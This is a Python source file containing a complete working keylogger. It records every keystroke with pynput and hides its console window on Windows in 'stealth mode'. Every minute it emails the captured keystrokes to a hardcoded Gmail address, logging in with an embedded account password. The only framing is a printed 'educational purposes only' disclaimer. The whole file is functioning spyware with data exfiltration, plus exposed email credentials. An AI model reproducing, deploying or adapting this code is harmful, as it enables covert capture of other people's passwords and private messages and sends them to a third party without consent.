import os
import sys
import time
import smtplib
from threading import Timer
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Configuration
LOG_INTERVAL = 60  # Seconds between email reports
EMAIL_ADDRESS = "alt.sarveshts@gmail.com"  # Use a disposable email
EMAIL_PASSWORD = "toJYtzz4"  # Use app-specific password
RECEIVER_EMAIL = "sarveshts2k4@gmail.com"
STEALTH_MODE = True  # Hide console window

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.start_dt = time.strftime("%Y-%m-%d_%H-%M-%S")
        self.timer = None
        self.listener = None

        if STEALTH_MODE:
            self.hide_console()

        # Create log directory if not exists
        if not os.path.exists("logs"):
            os.makedirs("logs")

    def hide_console(self):
        if sys.platform == 'win32':
            import win32gui
            import win32con
            win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            special_key = str(key).split(".")[-1]
            self.log += f" [{special_key.upper()}] "

        # Real-time file logging
        with open(f"logs/{self.start_dt}.log", "a", encoding="utf-8") as f:
            f.write(self.log[-1])

    def send_email(self):
        if self.log:
            # Create email message
            msg = MIMEMultipart()
            msg["From"] = EMAIL_ADDRESS
            msg["To"] = RECEIVER_EMAIL
            msg["Subject"] = f"Keylogger Report - {self.start_dt}"

            # Attach log
            msg.attach(MIMEText(self.log, "plain"))

            # Send email
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                server.sendmail(EMAIL_ADDRESS, RECEIVER_EMAIL, msg.as_string())

            # Reset log
            self.log = ""

        # Schedule next email
        self.timer = Timer(LOG_INTERVAL, self.send_email)
        self.timer.daemon = True
        self.timer.start()

    def start(self):
        # Start keyboard listener
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.daemon = True
        self.listener.start()

        # Schedule email reporting
        self.send_email()

        # Keep script running
        while True:
            time.sleep(10)

if __name__ == "__main__":
    # Add security disclaimer
    print("WARNING: This is for educational purposes only. Use only on systems you own.")
    print("Press Ctrl+C to exit...")
    
    keylogger = KeyLogger()
    try:
        keylogger.start()
    except KeyboardInterrupt:
        if keylogger.timer:
            keylogger.timer.cancel()
        keylogger.listener.stop()
        sys.exit(0)